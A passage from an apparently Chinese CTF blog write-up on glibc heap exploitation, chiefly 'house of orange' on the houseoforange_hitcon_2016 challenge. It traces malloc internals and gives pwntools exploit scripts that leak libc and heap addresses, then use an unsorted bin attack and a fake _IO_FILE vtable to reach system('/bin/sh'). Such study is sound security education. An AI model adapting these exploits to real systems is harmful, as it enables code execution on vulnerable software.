class="number">0x18</span>,b<span class="string">&quot;a&quot;</span>)</span><br><span class="line">add(<span class="number">0x18</span>,b<span class="string">&quot;b&quot;</span>)</span><br><span class="line">add(<span class="number">0x18</span>,b<span class="string">&quot;/bin/sh\0&quot;</span>)</span><br><span class="line">edit(<span class="number">1</span>,p32(elf.got[<span class="string">&quot;puts&quot;</span>])+p32(bss_adr+<span class="number">0x10</span>)+p32(elf.got[<span class="string">&quot;free&quot;</span>])+p32(bss_adr+<span class="number">0x40</span>))</span><br><span class="line">edit(<span class="number">2</span>,p32(elf.plt[<span class="string">&quot;puts&quot;</span>]))</span><br><span class="line"><span class="built_in">free</span>(<span class="number">0</span>)</span><br><span class="line">libc_base=u32(ru(b<span class="string">&quot;\xf7&quot;</span>))-libc.sym[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">edit(<span class="number">2</span>,p32(libc_base+libc.sym[<span class="string">&quot;system&quot;</span>]))</span><br><span class="line"><span class="built_in">free</span>(<span class="number">3</span>)</span><br><span class="line">it()</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656843524589-403356aa-8168-4fe6-9d3a-3bb7e5cbb007.png#averageHue=%23fbfaf9&clientId=u9d5fd636-f51f-4&from=paste&height=300&id=u80677bf7&originHeight=375&originWidth=794&originalType=binary&ratio=1&rotation=0&showTitle=false&size=99833&status=done&style=none&taskId=u3bc0d788-84c5-4fff-adc4-ebbb4b76952&title=&width=635.2" alt="image.png"></p>
<p>大概的源代码就是这里</p>
<p>remainder&#x3D;chunk_af_offset(victim,nb)</p>
<p>我们如果把nb构造合适的值，就可以实现向前或者移动top chunk达到任意地址读写</p>
<h2 id="house-of-orange"><a href="#house-of-orange" class="headerlink" title="house of orange"></a>house of orange</h2><ul>
<li>题目中没有给<code>free</code>之类的接口</li>
<li>可以修改<code>top_chunk</code>的<code>size</code>域</li>
</ul>
<h3 id="houseoforange-hitcon-2016"><a href="#houseoforange-hitcon-2016" class="headerlink" title="houseoforange_hitcon_2016"></a>houseoforange_hitcon_2016</h3><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#houseoforange_hitcon_2016">BUUCTF在线评测 (buuoj.cn)</a></p>
<p>挺复杂的一道题目，需要对libc源码有很清晰的分析</p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656843586898-28b067de-e4a9-46dd-be00-893557f146f9.png#averageHue=%233a3938&clientId=u9d5fd636-f51f-4&from=paste&height=102&id=ucd06f57c&originHeight=127&originWidth=936&originalType=binary&ratio=1&rotation=0&showTitle=false&size=38427&status=done&style=none&taskId=uf620cffb-d5bb-4faf-8e72-0209a2ed8fe&title=&width=748.8" alt="image.png"></p>
<h4 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h4><p>首先题目漏洞点很明确，edit可以随意溢出，但问题就是没有free函数<br><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656843601235-57b5c2bb-a522-459d-a3dd-3f672809e9d4.png#averageHue=%23fefefd&clientId=u9d5fd636-f51f-4&from=paste&height=616&id=u521c0e96&originHeight=770&originWidth=917&originalType=binary&ratio=1&rotation=0&showTitle=false&size=165948&status=done&style=none&taskId=u84c9c770-47db-4f43-a672-97ad51967e0&title=&width=733.6" alt="image.png"><br>所以我们要想方设法的free掉内容</p>
<h4 id="攻击前提"><a href="#攻击前提" class="headerlink" title="攻击前提"></a>攻击前提</h4><ul>
<li>可以控制top chunk的size</li>
</ul>
<h4 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">add(0x18,b&quot;a&quot;,1,56746)</span><br><span class="line">payload=p64(0)*3+p64(0x21)+p64(0)*3+p64(0xfa1)</span><br><span class="line">edit(len(payload),payload,1,2)</span><br><span class="line">debug()</span><br><span class="line">add(0x1000,b&quot;a&quot;,1,2)</span><br><span class="line">it()</span><br><span class="line">exit(0)</span><br></pre></td></tr></table></figure>
<p>这是分配之前的堆块size,可以看到top chunk size已经变了<br><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656843637345-950e94db-10cf-44f1-941f-6a44c08a6a86.png#averageHue=%23403e3c&clientId=u9d5fd636-f51f-4&from=paste&height=366&id=u559981f9&originHeight=457&originWidth=708&originalType=binary&ratio=1&rotation=0&showTitle=false&size=86076&status=done&style=none&taskId=u50b6e27f-670a-422c-9686-c186fa7519d&title=&width=566.4" alt="image.png"><br>第一次由于会自动malloc一个0x10的块，这里其实就是比较熟悉了，会从剩下的top chunk里面切割，把size变小，然后调整flag<br><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656843644314-f61b5dd4-60b2-4eca-aabd-0b0fe8ac2258.png#averageHue=%23383736&clientId=u9d5fd636-f51f-4&from=paste&height=185&id=u73a9f095&originHeight=231&originWidth=967&originalType=binary&ratio=1&rotation=0&showTitle=false&size=69294&status=done&style=none&taskId=u72ea607f-0d06-4970-a209-23b9917c493&title=&width=773.6" alt="image.png"><br>第二次是我们攻击的关键、<br>由于我们需要的size大于当前top chunk的size,所以会发生一些奇妙的内容<br><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656843653002-1842e515-3a35-4060-ac58-54b97246f06b.png#averageHue=%232c2a28&clientId=u9d5fd636-f51f-4&from=paste&height=582&id=u84a88699&originHeight=727&originWidth=752&originalType=binary&ratio=1&rotation=0&showTitle=false&size=125489&status=done&style=none&taskId=u94281885-ce46-466c-8bfb-0dac0d3a24d&title=&width=601.6" alt="image.png"><br>这个if肯定就进不去了<br><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656843661338-cca1c155-1267-4f98-813a-a9f14b006a20.png#averageHue=%234a4a49&clientId=u9d5fd636-f51f-4&from=paste&height=96&id=ub855aa3c&originHeight=120&originWidth=921&originalType=binary&ratio=1&rotation=0&showTitle=false&size=29644&status=done&style=none&taskId=u9aefc1c7-50a8-424a-b4b7-bc0a929cf5c&title=&width=736.8" alt="image.png"><br>进入到我们熟悉的sysmalloc<br><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656843667674-d12968a9-252d-4c85-9888-aad095550c27.png#averageHue=%231f1f1e&clientId=u9d5fd636-f51f-4&from=paste&height=167&id=u067cdb2c&originHeight=209&originWidth=807&originalType=binary&ratio=1&rotation=0&showTitle=false&size=34769&status=done&style=none&taskId=uf209a23c-8334-4de6-b399-f65ebe4d031&title=&width=645.6" alt="image.png"><br>这里会有几个check,主要有以下几个需要伪造,old_size≥MINISIZE，prev_inuse,还有就是会check old_end是否页对齐，也就是低3位是否全是0，<br><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656843673758-f295f1d5-cd62-4d12-b763-d88558cc13ac.png#averageHue=%233a3938&clientId=u9d5fd636-f51f-4&from=paste&height=217&id=uef61f7de&originHeight=271&originWidth=997&originalType=binary&ratio=1&rotation=0&showTitle=false&size=100925&status=done&style=none&taskId=u593181af-c9db-4997-ac93-04b358823cf&title=&width=797.6" alt="image.png"><br>重新根据需要划分了内存,size就是根据我们需要的nb大小然后页对齐计算的<br><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656843680306-d7a00c33-ab46-4b8a-a0a2-d633660dc796.png#averageHue=%23252424&clientId=u9d5fd636-f51f-4&from=paste&height=157&id=u13814e01&originHeight=196&originWidth=786&originalType=binary&ratio=1&rotation=0&showTitle=false&size=39068&status=done&style=none&taskId=u9dbb1d1d-4547-45ec-8d55-d836d27553a&title=&width=628.8" alt="image.png"><br>重新设置top chunk的位置<br><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656843685858-981b4cfa-406e-4954-a301-7affb7897162.png#averageHue=%23333231&clientId=u9d5fd636-f51f-4&from=paste&height=101&id=u7297c7c4&originHeight=126&originWidth=912&originalType=binary&ratio=1&rotation=0&showTitle=false&size=38136&status=done&style=none&taskId=u1692126a-cc51-4747-b001-826c4bd127e&title=&width=729.6" alt="image.png"><br>再old_topchunk后面加了两个0x11的块，暂时不知道有什么作用<br><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656843692291-4b09948b-e53a-4d1f-a217-a63890d7fdda.png#averageHue=%2331302f&clientId=u9d5fd636-f51f-4&from=paste&height=538&id=u931c5119&originHeight=673&originWidth=1025&originalType=binary&ratio=1&rotation=0&showTitle=false&size=164176&status=done&style=none&taskId=ubabf650d-7ec4-479d-9f0e-061c6125f04&title=&width=820" alt="image.png"><br>如果大小≥MINSIZE,就会free掉，所以我们就成功得到了一个free掉的块，还是unsoerted bin<br><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656843698447-763bd97b-8eb0-4c84-8fdd-533ed1d03eb2.png#averageHue=%235c5b5a&clientId=u9d5fd636-f51f-4&from=paste&height=111&id=u9b004142&originHeight=139&originWidth=784&originalType=binary&ratio=1&rotation=0&showTitle=false&size=30344&status=done&style=none&taskId=uf9c4faef-5e67-4d5b-92aa-bc0d47d7751&title=&width=627.2" alt="image.png"></p>
<h4 id="泄露libc和堆地址"><a href="#泄露libc和堆地址" class="headerlink" title="泄露libc和堆地址"></a>泄露libc和堆地址</h4><p>其实后面的过程就稍微好理解了，就是主要的新知识就在于怎么同时泄露堆地址和libc地址</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">add(0x18,b&quot;a&quot;,1,56746)</span><br><span class="line">payload=p64(0)*3+p64(0x21)+p64(0)*3+p64(0xfa1)</span><br><span class="line">edit(len(payload),payload,1,2)</span><br><span class="line">add(0x1000,b&quot;a&quot;,1,2)</span><br><span class="line">debug()</span><br><span class="line">add(0x3f8,b&quot;a&quot;,1,2)</span><br><span class="line">it()</span><br><span class="line">exit(0)</span><br></pre></td></tr></table></figure>
<p>这里可以看到有个unsorted bin,也就是上面我们free掉top chunk得到的，那么接下来就是要重新认识一下unsorted bin<br><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656843720802-c4eb8f4d-6dc3-4dba-b8ca-09d97a9fa9dc.png#averageHue=%232c2b2a&clientId=u9d5fd636-f51f-4&from=paste&height=154&id=ue9422569&originHeight=193&originWidth=875&originalType=binary&ratio=1&rotation=0&showTitle=false&size=32414&status=done&style=none&taskId=u54a6eb52-3235-48d6-9534-a37da960de1&title=&width=700" alt="image.png"><br>第一次分配0x10<br><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656843726075-e4e6ea77-db54-470c-af73-556b049ec072.png#averageHue=%23100e0e&clientId=u9d5fd636-f51f-4&from=paste&height=76&id=ud11d0340&originHeight=95&originWidth=923&originalType=binary&ratio=1&rotation=0&showTitle=false&size=22353&status=done&style=none&taskId=ue4bcf6c7-7508-4e02-bd25-886dfaf1ef7&title=&width=738.4" alt="image.png"><br>当fastbin和smallbin都无法分配的时候，就会进入unsorted bin,这里while循环就是逐步从unsorted bin里面取，当victim&#x3D;unsorted_chunks的时候就表示里面没有unsorted bin可用了<br><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656843734342-d5fbed3b-23fb-4a4a-98b3-574d238f4df3.png#averageHue=%2331302e&clientId=u9d5fd636-f51f-4&from=paste&height=142&id=ue428f20f&originHeight=178&originWidth=894&originalType=binary&ratio=1&rotation=0&showTitle=false&size=64574&status=done&style=none&taskId=u0440f881-2c40-4af2-821a-5ed6d7b9764&title=&width=715.2" alt="image.png"><br>这里由于我们的unsorted bin是last_remainder,所以他会判断如果请求的大小可以满足，就直接分割就好<br><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656843740279-907730f7-c78c-411d-a607-e8d2c4bd98ca.png#averageHue=%23424140&clientId=u9d5fd636-f51f-4&from=paste&height=137&id=u2142d9d3&originHeight=171&originWidth=1016&originalType=binary&ratio=1&rotation=0&showTitle=false&size=45473&status=done&style=none&taskId=ub1ca1a6b-b4b8-4b73-8bf2-c19361cc813&title=&width=812.8" alt="image.png"><br>这里其实过程很简单，修改size大小，修改unsorted bin里面的指针指向新的内容，也更新了av→last_remainder的信息<br><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656843755280-b8fbcaa2-6380-4385-b760-0e053238fb76.png#averageHue=%23312f2d&clientId=u9d5fd636-f51f-4&from=paste&height=114&id=uc25c30c2&originHeight=143&originWidth=894&originalType=binary&ratio=1&rotation=0&showTitle=false&size=69461&status=done&style=none&taskId=udeca8179-8a8b-40c2-b074-714d1975fe6&title=&width=715.2" alt="image.png"><br>上面就是unsorted bin的第一种分配特征，如果当前的unsorted bin里面只有一个last_remainder,如果大小合适的话就直接切割，然后修改信息就好<br>第二次我们分配一个比较大的，在large bin里面的size<br><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656843761443-5e5f41b6-0c41-4681-8ebb-0690bccc1005.png#averageHue=%23191717&clientId=u9d5fd636-f51f-4&from=paste&height=76&id=u98999b81&originHeight=95&originWidth=897&originalType=binary&ratio=1&rotation=0&showTitle=false&size=20064&status=done&style=none&taskId=ub9bcbec3-0783-40cb-ad9a-170465eb5bf&title=&width=717.6" alt="image.png"><br>首先上面那个if是不会进入了，所以我们就进入后面的操作<br>第一步就是把unsorted bin从链子上取下来<br><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656843766495-d2ed2d93-e14c-4046-9f22-e56301a839de.png#averageHue=%23333130&clientId=u9d5fd636-f51f-4&from=paste&height=103&id=uc503663c&originHeight=129&originWidth=833&originalType=binary&ratio=1&rotation=0&showTitle=false&size=37847&status=done&style=none&taskId=u7f96bfb5-ac4e-4d84-97ad-e74a95a6744&title=&width=666.4" alt="image.png"><br>从这里开始就是尝试去把这个unsorted bin放入到largebin里面<br><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656843773723-3a86802e-9b05-459c-9e4e-bfb73c5c94e2.png#averageHue=%232b2a29&clientId=u9d5fd636-f51f-4&from=paste&height=158&id=u534cd323&originHeight=198&originWidth=813&originalType=binary&ratio=1&rotation=0&showTitle=false&size=48055&status=done&style=none&taskId=ub4605e1d-3905-4a46-860b-81587a58015&title=&width=650.4" alt="image.png"><br>这里面由于是空的所以if失败<br>这一步暂时不知道是是什么意思，因为fd_nextsize是指向不同大小的<br><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656843782339-d77d2b33-3c7a-4868-92c5-488018f96448.png#averageHue=%23343332&clientId=u9d5fd636-f51f-4&from=paste&height=73&id=ucb64f2cb&originHeight=91&originWidth=923&originalType=binary&ratio=1&rotation=0&showTitle=false&size=24256&status=done&style=none&taskId=ud2e21909-5dab-405a-a3b5-fdc33533df6&title=&width=738.4" alt="image.png"><br>mark_bin的作用就是标记对应binmap里面有chunk，后面就是完成large bin的上链<br><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656843787581-38a13f9f-a26a-4f9b-abb2-927e50cc5085.png#averageHue=%23383736&clientId=u9d5fd636-f51f-4&from=paste&height=146&id=ub6e380db&originHeight=183&originWidth=595&originalType=binary&ratio=1&rotation=0&showTitle=false&size=37628&status=done&style=none&taskId=u988fc339-f488-40fa-b005-7e61093e442&title=&width=476" alt="image.png"><br>然后就会重新进到while循环里面去，这个时候由于unsorted bin空了，所以退出<br><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656843798307-7756e8be-d84c-417e-87d7-ba54279ee799.png#averageHue=%23232322&clientId=u9d5fd636-f51f-4&from=paste&height=227&id=u530f6ed3&originHeight=284&originWidth=961&originalType=binary&ratio=1&rotation=0&showTitle=false&size=63196&status=done&style=none&taskId=u3dcd60aa-3a9f-453d-b8ba-f9b1dfa3980&title=&width=768.8" alt="image.png"><br>然后就找到了我们刚刚从unsorted bin里面放入到large bin里面的chunk了<br><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656843804928-67f54004-baee-49e6-a584-6d3d856c82e1.png#averageHue=%23434241&clientId=u9d5fd636-f51f-4&from=paste&height=232&id=ufabd7366&originHeight=290&originWidth=955&originalType=binary&ratio=1&rotation=0&showTitle=false&size=73907&status=done&style=none&taskId=ud94c97e3-0ed4-4d00-befe-3663e297df1&title=&width=764" alt="image.png"><br>首先就是把这个larege bin取下来，然后由于remainder_size》MINIsize,又被重新放回unsorted bin<br><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656843813249-5635e58d-c75c-4d1b-9d81-e4447c9f71ad.png#averageHue=%236e6d6c&clientId=u9d5fd636-f51f-4&from=paste&height=306&id=u3e764269&originHeight=383&originWidth=1014&originalType=binary&ratio=1&rotation=0&showTitle=false&size=104468&status=done&style=none&taskId=u249b06f6-edc9-4fea-b02c-bf80cbdc726&title=&width=811.2" alt="image.png"><br>设置对应的信息<br><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656843820390-e66f3757-4014-458c-994c-0ca7b6339f9b.png#averageHue=%232e2b29&clientId=u9d5fd636-f51f-4&from=paste&height=113&id=ub9a290ef&originHeight=141&originWidth=915&originalType=binary&ratio=1&rotation=0&showTitle=false&size=62538&status=done&style=none&taskId=u814defd5-88a5-4663-b73b-8b518dd517a&title=&width=732" alt="image.png"><br>这里面就是逐步遍历，按照最小匹配原则去寻找<br>但这里比较奇怪的就是av→last_remainder没有被指到最新的unsorted bin<br>但因为之后有一个calloc比较小的，有下面这样的操作，当从large bin里面取内容的时候，如果剩下的大小≥MINISIZE，就会被放入unsorted bin中，当请求的nb在smallbin里面，就会把这个剩下的unsoretd bin放入到last_remainde,为什么需要这么判断呢<br>因为如果请求的是一个smallbin范围的，前面的过程说明small bin,unsorted bin都没有，也表明当前的remainder也没有，所以这个时候我们就可以合理的更新last_remainder位当前这个unsorete bin,但是下面这个操作我是真的没看懂，因为remainder→fd_nextsize是空的，不知道为什么还要弄成NULL,难道不应该把 victim的弄成NULL嘛<br><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656843826342-16237a80-18c3-4de0-b4f3-f4db97577741.png#averageHue=%231a1817&clientId=u9d5fd636-f51f-4&from=paste&height=190&id=u5ef7d176&originHeight=237&originWidth=911&originalType=binary&ratio=1&rotation=0&showTitle=false&size=75967&status=done&style=none&taskId=u20b5b028-9563-4996-82e9-7e29c0fb5e5&title=&width=728.8" alt="image.png"><br>所以unsorted bin的时候，只要第一个if的判断是否，那么就会进入后面的解链操作，如果大小在large bin范围就会放入largebin里面，当然第一个判断位true，那就直接从remainder里面切割<br>接下来就是泄露libc和堆地址，因为这里是printf，所以需要两次，第一次泄露libc,第二次就是把泄露堆地址<br><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656843832680-d5b76bc7-90b8-4917-b956-b93dea55485e.png#averageHue=%230c0b0b&clientId=u9d5fd636-f51f-4&from=paste&height=94&id=u81d37f52&originHeight=118&originWidth=917&originalType=binary&ratio=1&rotation=0&showTitle=false&size=51720&status=done&style=none&taskId=u07ad7b59-fd1a-4944-93a6-244ba0c691d&title=&width=733.6" alt="image.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">add(0x18,b&quot;a&quot;,1,56746)</span><br><span class="line">payload=p64(0)*3+p64(0x21)+p64(0)*3+p64(0xfa1)</span><br><span class="line">edit(len(payload),payload,1,2)</span><br><span class="line">add(0x1000,b&quot;a&quot;,1,2)</span><br><span class="line">add(0x3f8,b&quot;a&quot;,1,2)</span><br><span class="line">show()</span><br><span class="line">ru(b&quot;Name of house : &quot;)</span><br><span class="line">libc_base=u64(ru(b&quot;\x7f&quot;).ljust(8,b&quot;\0&quot;))-0x7feee024d161+0x7feedfe88000</span><br><span class="line">edit(0x10,b&quot;a&quot;*0x10,1,2)</span><br><span class="line">show()</span><br><span class="line">ru(b&quot;Name of house : aaaaaaaaaaaaaaaa&quot;)</span><br><span class="line">heap_addr=u64(rld().ljust(8,b&quot;\0&quot;))</span><br></pre></td></tr></table></figure>
<h4 id="攻击malloc-printrr"><a href="#攻击malloc-printrr" class="headerlink" title="攻击malloc_printrr"></a>攻击malloc_printrr</h4><p>首先利用unosrted bin attack往IO_list_all写入main_arena地址，然后利用这个过程中会</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">add(0x18,b&quot;a&quot;,1,56746)</span><br><span class="line">payload=p64(0)*3+p64(0x21)+p64(0)*3+p64(0xfa1)</span><br><span class="line">edit(len(payload),payload,1,2)</span><br><span class="line">add(0x1000,b&quot;a&quot;,1,2)</span><br><span class="line">add(0x3f8,b&quot;a&quot;,1,2)</span><br><span class="line">show()</span><br><span class="line">ru(b&quot;Name of house : &quot;)</span><br><span class="line">libc_base=u64(ru(b&quot;\x7f&quot;).ljust(8,b&quot;\0&quot;))-0x7feee024d161+0x7feedfe88000</span><br><span class="line">edit(0x10,b&quot;a&quot;*0x10,1,2)</span><br><span class="line">show()</span><br><span class="line">ru(b&quot;Name of house : aaaaaaaaaaaaaaaa&quot;)</span><br><span class="line">heap_addr=u64(rld().ljust(8,b&quot;\0&quot;))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=p64(0)*0x7f+p64(0x21)+p64(0)*2+b&quot;/bin/sh\0&quot;+p64(0x61)+p64(0)+p64(libc_base+libc.sym[&quot;_IO_list_all&quot;]-0x10)#unsorted bin attack+fake size</span><br><span class="line">fake_IO_structure=p64(0)+p64(1)+p64(0)*0x15+p64(heap_addr+0x500)</span><br><span class="line">payload+=fake_IO_structure</span><br><span class="line">fake_vtable=p64(0)*3+p64(libc_base+libc.sym[&quot;system&quot;])</span><br><span class="line">payload+=fake_vtable</span><br><span class="line">edit(len(payload),payload,1,2)</span><br><span class="line">sla(b&quot;Your choice : &quot;, b&quot;1&quot;)</span><br><span class="line">it()</span><br></pre></td></tr></table></figure>
<p>这里我们主要做了就是修改unsorted bin的size,并且修改了bk指针(unosrted bin attack)<br><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656843870659-4f34887c-64a3-4a02-af99-2976235277d2.png#averageHue=%23494848&clientId=u9d5fd636-f51f-4&from=paste&height=354&id=u30b4aa25&originHeight=442&originWidth=1017&originalType=binary&ratio=1&rotation=0&showTitle=false&size=156888&status=done&style=none&taskId=u8341df27-6833-4c85-8348-054f0f5ceb3&title=&width=813.6" alt="image.png"><br>这里因为bck被修改了，所以肯定不等于，所以跳过<br>这里之后就是我说过的<br>只要过了if判断，并且size≠nb,那么就会接链（unsorted bin attack）,分配到对应的small bin,large bin<br>_IO_list_all被修改<br><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656843877382-9e25d68c-faed-46ce-8f6b-310f9efd97e4.png#averageHue=%23383534&clientId=u9d5fd636-f51f-4&from=paste&height=54&id=ubf9284a4&originHeight=67&originWidth=955&originalType=binary&ratio=1&rotation=0&showTitle=false&size=18724&status=done&style=none&taskId=u44ac9b00-2119-49f9-8177-06c16c78241&title=&width=764" alt="image.png"><br>这里我们利用放入到smallbin的性质<br><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656843885688-f808ff4a-956d-44bf-9332-08a7e07b0e80.png#averageHue=%233b3a39&clientId=u9d5fd636-f51f-4&from=paste&height=346&id=u077cd587&originHeight=432&originWidth=918&originalType=binary&ratio=1&rotation=0&showTitle=false&size=91624&status=done&style=none&taskId=u62972454-6234-460f-9324-2d79153d54a&title=&width=734.4" alt="image.png"><br>成功链入<br><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656843892148-87a71f83-14b6-4412-84d9-06ded23d9e2c.png#averageHue=%234e4c49&clientId=u9d5fd636-f51f-4&from=paste&height=106&id=u9fd669e6&originHeight=132&originWidth=1051&originalType=binary&ratio=1&rotation=0&showTitle=false&size=76440&status=done&style=none&taskId=udf137884-939f-48d2-a81e-b980a517913&title=&width=840.8" alt="image.png"><br>回到while<br>但这个时候明显我们unsorted bin坏掉了<br>因为刚才解链的操作导致下一个chunk是我们的伪造的bk，这个大小是0，所以会进入malloc_printerr<br><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656843900440-d82269a5-0620-4d21-b81a-860c11b0e9cc.png#averageHue=%23424140&clientId=u9d5fd636-f51f-4&from=paste&height=141&id=u4e64d8e7&originHeight=176&originWidth=982&originalType=binary&ratio=1&rotation=0&showTitle=false&size=67301&status=done&style=none&taskId=u21d1a35c-7017-4d35-8166-0729e912cd7&title=&width=785.6" alt="image.png"><br>我们刚好就要利用的就是malloc_printerr<br><img src="https://cdn.nlark.com/yuque/0/2022/png/29417415/1656843910161-128cd96e-3fae-4cdc-89ea-99f6bee76976.png#averageHue=%23252524&clientId=u9d5fd636-f51f-4&from=paste&height=242&id=u21b1483e&originHeight=302&originWidth=965&originalType=binary&ratio=1&rotation=0&showTitle=false&size=69161&status=done&style=none&taskId=u3df7c791-85bb-41dd-aaa3-8e13f5d61eb&title=&width=772" alt="image.png"><br>malloc_printerr会经过一些系列的调用链来到_IO_flush_all_lockp,可以打IO</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">int</span><br><span class="line">_IO_flush_all_lockp (int do_lock)</span><br><span class="line">&#123;</span><br><span class="line">  int result = 0;</span><br><span class="line">  struct _IO_FILE *fp;</span><br><span class="line">  int last_stamp;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">  last_stamp = _IO_list_all_stamp;//0</span><br><span class="line">  fp = (_IO_FILE *) _IO_list_all;</span><br><span class="line">  while (fp != NULL)</span><br><span class="line">    &#123;</span><br><span class="line">      run_fp = fp;</span><br><span class="line">      if (do_lock)</span><br><span class="line">    _IO_flockfile (fp);</span><br><span class="line"> </span><br><span class="line">      if (((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line">       )</span><br><span class="line">      &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">    result = EOF;</span><br><span class="line"> </span><br><span class="line">      if (do_lock)</span><br><span class="line">    _IO_funlockfile (fp);</span><br><span class="line">      run_fp = NULL;</span><br><span class="line"> </span><br><span class="line">      if (last_stamp != _IO_list_all_stamp)</span><br><span class="line">    &#123;</span><br><span class="line">      /* Something was added to the list.  Start all over again.  */</span><br><span class="line">      fp = (_IO_FILE *) _IO_list_all;</span><br><span class="line">      last_stamp = _IO_list_all_stamp;</span><br><span class="line">    &#125;</span><br><span class="line">      else</span><br><span class="line">    fp = fp-&gt;_chain;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">#ifdef _IO_MTSAFE_IO</span><br><span class="line">  if (do_lock)</span><br><span class="line">    _IO_lock_unlock (list_all_lock);</span><br><span class="line">  __libc_cleanup_region_end (0);</span><br><span class="line">#endif</span><br><span class="line"> </span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
